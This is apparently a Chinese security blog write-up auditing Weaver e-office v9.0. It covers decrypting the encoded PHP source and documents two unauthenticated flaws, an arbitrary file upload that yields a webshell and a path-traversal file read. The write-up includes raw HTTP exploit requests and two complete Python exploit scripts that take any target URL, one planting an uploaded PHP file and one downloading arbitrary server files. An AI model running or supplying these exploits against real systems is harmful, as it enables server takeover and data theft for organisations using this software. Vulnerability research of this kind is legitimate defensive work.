## 漏洞简介

泛微e-office是一款标准化的协同OA办公软件，实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。由于泛微
E-Office
未能正确处理上传模块中输入的数据，未授权的攻击者可以构造恶意数据包发送给服务器，实现任意文件上传，并且获得服务器的webshell，成功利用该漏洞可以获取服务器控制权。未授权的攻击者可以构造恶意的数据包，读取服务器上的任意文件

漏洞影响范围 E-office Server_v9.0

默认安装位置是 `d:\eoffice`在虚拟机内安装没有 D 盘，所以安装位置是 `c:\eoffice`

安装完成后，服务默认在 `8082`端口 通过主机名 或 ip 地址都可以访问到

![image-20220913114908-ilx3bne.png](https://image.3001.net/images/20220928/1664331083_6333ad4b3a8232ee7af12.png!small)

代码位置在 `C:\eoffice\webroot`同样代码也是被加密了的

通过免费的解密网站获得了加密的具体信息 `ZEND加密PHP5.2版本``<http://www.phpjm.cc/>`

![image-20220913145028-48we72j.png](https://image.3001.net/images/20220928/1664331084_6333ad4c165669c662098.png!small)

利用工具进行批量的解密，因为工具点击一次只能进行一次解密，所以利用模拟点击的工具进行模拟点击
[KeymouseGo](https://github.com/taojy123/KeymouseGo)

![image-20220913162007-x2h3fa8.png](https://image.3001.net/images/20220928/1664331085_6333ad4d20dee1ce11ea6.png!small)

## 任意文件上传漏洞

### 漏洞利用

`/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=`

‍

    
    
    POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1  
    Host: 10.0.21.14:8082  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9  
    Connection: close  
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryykJoMlQs3JMOsgi3  
    Content-Length: 175  
    ​  
    ------WebKitFormBoundaryykJoMlQs3JMOsgi3  
    Content-Disposition: form-data; name="Filedata"; filename="1.php"  
    ​  
    <?php phpinfo();?>  
    ------WebKitFormBoundaryykJoMlQs3JMOsgi3--
![image-20220915114631-njm14hf.png](https://image.3001.net/images/20220928/1664331086_6333ad4e502403e8ec61e.png!small)

上传文件的地址 `<http://10.0.21.14:8082/images/logo/logo-eoffice.php>`

![image-20220915114727-010n1h4.png](https://image.3001.net/images/20220928/1664331087_6333ad4f635d9a64ead02.png!small)

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

### 漏洞分析

漏洞的主要位于 `general/index/UploadFile.php`

![image-20220915115441-vu2ikws.png](https://image.3001.net/images/20220928/1664331088_6333ad505b91eacb63f0c.png!small)

通过 `$_GET`方法获取的参数 m，调用 `UploadFile`中的任意方法

我们选择其中的 `uploadPicture`方法

![image-20220915120054-41yba8d.png](https://image.3001.net/images/20220928/1664331089_6333ad51452a681590248.png!small)

没有对传入的文件进行过滤，如果传入一个 php 文件，命名为 1.php 最后上传文件会变为 logo-eoffice.php
传入的位置是`$_SERVER['DOCUMENT_ROOT']."/images/logo/"`

### 利用脚本

    
    
    import sys  
    import requests  
    ​  
    def request_shell(url):  
    targeturl = url + "/images/logo/logo-eoffice.php"  
    response = requests.get(targeturl)  
    if(response.status_code == 200):  
    print("获取 shell 成功，shell地址为："+targeturl)  
    ​  
    def request_upload(url,data):  
    targeturl = url + "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="  
    targetfile = {'Filedata':('upload.php',data,'text/plain')}  
    response = requests.post(url = targeturl, files = targetfile)  
    if(response.status_code == 200):  
    print("上传成功")  
      
    def read_uploadfile(url,filename):  
    with open(filename) as f:  
    data = f.read()  
    request_upload(url,data)  
    ​  
    def upload_file(url,filename):  
    if (filename == "phpinfo.php"):  
    data = "<?php phpinfo(); ?>"  
    request_upload(url,data)  
    else:  
    read_uploadfile(url,filename)  
    ​  
    ​  
    def main():  
    if len(sys.argv) < 3:  
    print("Usage: upload_file.py targeturl filename\n"  
    "Example: python upload_file.py http://10.0.21.14:8082 phpinfo.php")  
    exit()  
    url = sys.argv[1]  
    filename = sys.argv[2]  
    upload_file(url,filename)  
    request_shell(url)  
    ​  
    if __name__ == '__main__':  
    main()

## 任意文件下载漏洞

### 漏洞利用

    
    
    GET /inc/attach.php?path=/../../../../../1.txt HTTP/1.1  
    Host: 10.0.21.14:8082  
    Origin: http://10.0.21.14:8082  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36  
    Accept: */*  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9  
    Connection: close

‍![image-20220915174155-0q3eg95.png](https://image.3001.net/images/20220928/1664331090_6333ad5239b8608c11caa.png!small)

‍漏洞分析

`inc/attach.php`

![image-20220915204730-a0lml95.png](https://image.3001.net/images/20220928/1664331091_6333ad533e0f626f0b1c5.png!small)

‍直接传入参数 $path 最后会读取 $path
的内容并将结果返回出来，我们注意到利用未授权就可将文件下载下来，从代码层面并没有看出来原因，但是通过浏览器直接访问时无法访问到，进行了 302 跳转，通过
burpsuite 就可以访问到，攥写脚本禁止 302 跳转也可以读取出来。

漏洞的主要来源位于

![image-20220915205826-r684z4r.png](https://image.3001.net/images/20220928/1664331092_6333ad542c44c1df7ebc0.png!small)

我们看一下文件的下载链接

![image-20220915205855-ug2bjxf.png](https://image.3001.net/images/20220928/1664331093_6333ad550acf7e6f79ab4.png!small)

### 利用脚本

    
    
    import sys  
    import requests  
    import re  
    ​  
    def save_reponse(re_result,filename):  
    filename=re.findall("[^/]+$",filename)[0]  
    # print(filename)  
    with open(filename, 'w',encoding='gb18030') as f:  
    f.write(re_result)  
    ​  
    def re_response(response):  
    re_result = response[1507:]  
    return re_result  
    ​  
    ​  
      
    ​  
    def read_file(url,filename):  
    targeturl = url + "/inc/attach.php?path="+filename  
    response = requests.get(url = targeturl, allow_redirects=False)  
    # print(response.text)  
    re_result = re_response(response.text)  
    print(re_result)  
    save_reponse(re_result,filename)  
    ​  
    def main():  
    if len(sys.argv) < 3:  
    print("Usage: upload_file.py targeturl filename\n"  
    "Example: python read_file.py http://10.0.21.14:8082 attach.php")  
    exit()  
    url = sys.argv[1]  
    filename = sys.argv[2]  
    read_file(url,filename)  
    ​  
    if __name__ == '__main__':  
    main()

![image-20220915184301-uitnga7.png](https://image.3001.net/images/20220928/1664331093_6333ad55b1d75105a36a6.png!small)

还有一些 SQL 注入漏洞，还可以继续进一步的进行审计分析。

